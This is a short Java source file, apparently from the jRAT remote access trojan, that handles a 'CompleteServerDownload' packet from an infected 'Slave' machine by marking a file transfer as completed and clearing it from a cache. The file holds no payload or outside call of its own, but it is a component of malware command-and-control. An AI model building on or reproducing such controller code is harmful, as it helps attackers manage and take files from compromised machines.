package jrat.controller.packets.incoming;

import jrat.common.io.FileCache;
import jrat.common.io.TransferData;
import jrat.common.io.TransferData.State;
import jrat.controller.Slave;


public class Packet31CompleteServerDownload implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String file = slave.readLine();
		
		TransferData data = FileCache.get(file);
		data.setState(State.COMPLETED);
		FileCache.clear(file);
	}

}
